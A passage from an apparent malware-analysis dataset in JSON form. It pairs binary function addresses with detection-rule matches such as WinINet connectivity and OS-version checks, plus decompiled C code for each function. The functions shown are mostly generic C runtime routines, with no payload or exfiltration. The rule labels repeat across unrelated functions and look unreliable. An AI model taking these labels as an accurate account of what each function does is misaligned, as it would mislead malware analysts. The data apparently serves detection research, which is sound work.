}\n        cVar2 = *(iVar11 + 5);\n        cVar4 = fcn.00401195();\n        if (cVar2 == cVar4) {\n            puVar8 = fcn.00401366();\n            iVar11 = *(unaff_EBP + -0x80);\n            *puVar12 = **puVar8;\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x84) = puVar12;\n            fcn.00401c5d();\n        }\n        else {\n            iVar11 = *(unaff_EBP + -0x80);\n        }\n    }\n    if (*(unaff_EBP + -0x70) == 0) {\n        cVar2 = fcn.00403f7b(uVar15);\n        if (cVar2 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x6c);\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.00401c5d();\n                cVar2 = fcn.00403f7b(uVar15);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x6c) = iVar14;\n            puVar12 = *(unaff_EBP + -0x84);\n        }\n        iVar14 = *(unaff_EBP + -0x6c);\n        if (iVar14 < 0) {\n            *puVar12 = 0x30;\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x6c) = iVar14 + 1;\n        }\n    }\n    while (cVar2 = fcn.00403f7b(uVar15),  cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar6 = fcn.00402725(unaff_EBP + -0x30, *(iVar11 + 5));\n        if (0x15 < uVar6) break;\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < *(unaff_EBP + -0x90)) {\n            *puVar12 = *(uVar6 + 0x54da34);\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.00401c5d();\n    }\n    cVar2 = *(unaff_EBP + -0x61);\n    puVar13 = puVar12;\n    if (cVar2 == '\\0') goto code_r0x004650fb;\n    cVar2 = fcn.00403f7b(uVar15);\n    if (cVar2 != '\\0') {\ncode_r0x004650f8:\n        cVar2 = *(unaff_EBP + -0x61);\ncode_r0x004650fb:\n        if ((*(unaff_EBP + -99) != '\\0') || (cVar2 == '\\0')) {\n            puVar13 = *(unaff_EBP + -0x88);\n        }\n        puVar8 = *(unaff_EBP + -0x94);\n        uVar15 = *(unaff_EBP + -0x6c);\n        *puVar13 = 0;\n        *puVar8 = uVar15;\n        fcn.004029b9();\n        fcn.004067d0();\n        return;\n    }\n    if (*(iVar11 + 4) == '\\0') {\n        fcn.004019e7();\n    }\n    cVar2 = *(iVar11 + 5);\n    if (cVar2 != *(unaff_EBP + -0x15)) {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n            cVar2 = *(iVar11 + 5);\n        }\n        if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x004650f8;\n    }\n    *puVar12 = 0x70;\n    puVar13 = puVar12 + 1;\n    fcn.00401c5d();\n    *(unaff_EBP + -0x61) = 0;\n    iVar14 = 0;\n    cVar2 = fcn.00403f7b(*(unaff_EBP + -0x68));\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 == *(unaff_EBP + -0x19)) {\n            *puVar13 = 0x2b;\n        }\n        else {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x0046505e;\n            *puVar13 = 0x2d;\n        }\n        puVar13 = puVar12 + 1;\n        fcn.00401c5d();\n    }\ncode_r0x0046505e:\n    cVar2 = fcn.00403f7b(*(unaff_EBP + -0x68));\n    if (cVar2 == '\\0') {\n        do {\n            cVar4 = *(iVar11 + 4);\n            cVar2 = *(unaff_EBP + -0x61);\n            *(unaff_EBP + -0x61) = cVar2;\n            if (cVar4 == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(unaff_EBP + -0x61);\n            }\n            if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) {\n                if (cVar2 == '\\0') goto code_r0x004650ad;\n                break;\n            }\n            *(unaff_EBP + -0x61) = 1;\n            fcn.00401c5d();\n            cVar2 = fcn.00403f7b(*(unaff_EBP + -0x68));\n        } while (cVar2 == '\\0');\n        *puVar13 = 0x30;\n        puVar13 = puVar13 + 1;\n    }\ncode_r0x004650ad:\n    do {\n        cVar2 = fcn.00403f7b(*(unaff_EBP + -0x68));\n        if (cVar2 != '\\0') goto code_r0x004650f8;\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar6 = fcn.00402725(unaff_EBP + -0x30, *(iVar11 + 5));\n        if (0x15 < uVar6) goto code_r0x004650f8;\n        if (iVar14 < 8) {\n            *puVar13 = *(uVar6 + 0x54da34);\n            puVar13 = puVar13 + 1;\n            iVar14 = iVar14 + 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.00401c5d();\n    } while( true );\n}\n",
        "token_count": 5473
    },
    "004065ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004065ff(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b198, 8);\n    if (0 < *0x56ec4c) {\n        if (((*(unaff_EBP + 8) & 0x40) == 0) || (*0x56ce74 == 0)) {\n            *(unaff_EBP + 8) = *(unaff_EBP + 8) & 0xffffffbf;\n        }\n        else {\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 215
    },
    "0040660e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040660e(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.0040579f(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00477350:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ef7(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x00477350;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x0047735c;\n        fVar4 = fcn.00402bad(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x0047735c:\n    cVar3 = fcn.0040640b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 566
    },
    "00406663": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406663(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00401190(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 350
    },
    "00406677": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406677(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == NULL) {\n        arg_10h = 0x570718;\n    }\n    uVar1 = (arg_ch & 0xffff) + 0x2400;\n    if (*arg_10h == 0) {\n        if (0x3ff < uVar1) {\n            if (0x3ff < arg_ch + 0x2800U) {\n                uVar2 = fcn.00402702(arg_8h, arg_ch & 0xffff, arg_10h);\n                return uVar2;\n            }\n            *arg_10h = ((arg_ch & 0x27ff) + 0x40) * 0x400;\n            return 0;\n        }\n    }\n    else if (uVar1 < 0x400) {\n        var_8h = 0;\n        var_4h = 0;\n        uVar2 = fcn.00402702(arg_8h, (arg_ch & 0x23ff) + *arg_10h, &var_8h);\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return uVar2;\n    }\n    uVar2 = fcn.004025c7(arg_10h);\n    return uVar2;\n}\n",
        "token_count": 349
    },
    "00418ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00418ec0(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e370;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 252
    },
    "0040668b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040668b(int32_t param_1, uint32_t param_2, char param_3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar auStack40 [28];\n    \n    uVar2 = (*(param_1 + 0xc) | param_2) & 0x17 | (*(param_1 + 0x38) == 0) << 2;\n    *(param_1 + 0xc) = uVar2;\n    uVar2 = uVar2 & *(param_1 + 0x10);\n    if (uVar2 == 0) {\n        return;\n    }\n    if (param_3 != '\\0') {\n        uVar2 = fcn.004066d1(0, 0);\n    }\n    uVar3 = 0x5416b6;\n    if ((uVar2 & 2) == 0) {\n        uVar3 = 0x5416d0;\n    }\n    uVar4 = 0x54169d;\n    if ((uVar2 & 4) == 0) {\n        uVar4 = uVar3;\n    }\n    fcn.00404372(&stack0xffffffd0, 1);\n    fcn.004062f8(uVar4, &stack0xffffffd0);\n    fcn.004066d1(auStack40, 0x560cfc);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 349
    },
    "0040669a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040669a(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.004051dc(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x0048962f;\n        }\n    }\n    else {\n        iVar2 = fcn.004051dc(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.00401145(arg_8h, arg_ch);\n            goto code_r0x0048962f;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x0048962f:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "004066d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004066d6(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049f024:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049f028:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049f02b:\n            cVar4 = fcn.00401df2(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049efd0:\n                arg_8h = 0x10;\n                goto code_r0x0049f02b;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049efe4;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049efb8;\n                }\n            }\ncode_r0x0049f034:\n            cVar4 = fcn.0040100f();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405d9e();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049f034;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049efe4:\n            cVar4 = fcn.00402fa4(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004066a9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049f034;\n            if (cVar4 == 'i') goto code_r0x0049f024;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004034fe();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00404340();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049efd0;\n            }\n            goto code_r0x0049f028;\n        }\ncode_r0x0049efb8:\n        cVar4 = fcn.00404c91();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049f0ba;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f0ba:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.004053da(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401843(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2368
    },
    "004066fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004066fe(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if ((-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) && (fcn.00403eb8(&var_4h),  var_4h == 1)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 102
    },
    "0040672b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040672b(uint8_t **arg_8h, uint arg_ch)\n\n{\n    uint8_t *arg_8h_00;\n    uint8_t uVar1;\n    uint *in_ECX;\n    uint8_t *puVar2;\n    int32_t arg_ch_00;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    arg_8h_00 = *arg_8h;\n    uVar1 = *arg_8h_00;\n    if (uVar1 != 0) {\n        arg_ch_00 = 0;\n        puVar2 = arg_8h_00;\n        do {\n            if (uVar1 == arg_ch) break;\n            if ((*(uVar1 + 0x54f8c0) == '\\0') && ((*0x56f460 & 0x10000) == 0)) {\n                *(in_ECX + 1) = 2;\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            puVar2 = puVar2 + 1;\n            *arg_8h = puVar2;\n            uVar1 = *puVar2;\n        } while (uVar1 != 0);\n        fcn.0040597a(arg_8h_00, arg_ch_00);\n        uVar1 = **arg_8h;\n        if (uVar1 != 0) {\n            *arg_8h = *arg_8h + 1;\n            if (uVar1 == arg_ch) {\n                return;\n            }\n            *in_ECX = 0;\n            *(in_ECX + 1) = 3;\n            return;\n        }\n        if (*(in_ECX + 1) != '\\0') {\n            return;\n        }\n    }\n    *(in_ECX + 1) = 1;\n    return;\n}\n",
        "token_count": 421
    },
    "00406749": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406749(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "0040676c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0040676c(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040448a(0x26);\n    uVar1 = fcn.004039f4(&var_10h);\n    fcn.00402eb9(uVar1);\n    if ((var_4h < '\\x02') && (**0x56f458 == '@')) {\n        *0x56f458 = *0x56f458 + 1;\n        var_10h = 0x54f380;\n        var_ch = 2;\n        fcn.00405c95(&var_10h);\n        uVar1 = fcn.00402919(&var_10h, 0, 0);\n        fcn.00402eb9(uVar1);\n        if (**0x56f458 == '@') {\n            *0x56f458 = *0x56f458 + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n    }\n    arg_8h[1] = 0;\n    *(arg_8h + 1) = 2;\n    *arg_8h = 0;\n    return arg_8h;\n}\n",
        "token_count": 377
    },
    "004067bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004067bc(uint *arg_8h)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.004053d5(&var_8h);\n    if (var_4h < '\\x02') {\n        fcn.00403cba(0x7b);\n        bVar2 = false;\n        pcVar4 = *0x56f458;\n        do {\n            if (bVar2) {\n                fcn.00403cba(0x2c);\n                pcVar4 = *0x56f458;\n            }\n            cVar1 = *pcVar4;\n            if (cVar1 == '2') {\n                *0x56f458 = pcVar4 + 1;\n                uVar3 = fcn.004067bc(&var_30h);\ncode_r0x00490f1a:\n                fcn.00402eb9(uVar3);\n                pcVar4 = *0x56f458;\n            }\n            else {\n                if (cVar1 == '3') {\n                    *0x56f458 = pcVar4 + 1;\n                    uVar3 = fcn.00404606(&var_28h);\n                    goto code_r0x00490f1a;\n                }\n                if (cVar1 == '4') {\n                    *0x56f458 = pcVar4 + 1;\n                    uVar3 = fcn.0040286f(&var_20h);\n                    goto code_r0x00490f1a;\n                }\n                if (cVar1 != '@') {\n                    uVar3 = fcn.004053d5(&var_10h);\n                    fcn.00402eb9(uVar3);\n                    fcn.00403cba(0x3a);\n                    uVar3 = fcn.00403deb(&var_18h);\n                    goto code_r0x00490f1a;\n                }\n            }\n            if ('\\x01' < var_4h) break;\n            if (*pcVar4 == '@') {\n                *0x56f458 = pcVar4 + 1;\n                fcn.00403cba(0x7d);\n                *arg_8h = var_8h;\n                arg_8h[1] = var_4h;\n                return arg_8h;\n            }\n            bVar2 = true;\n        } while( true );\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 672
    },
    "004067da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
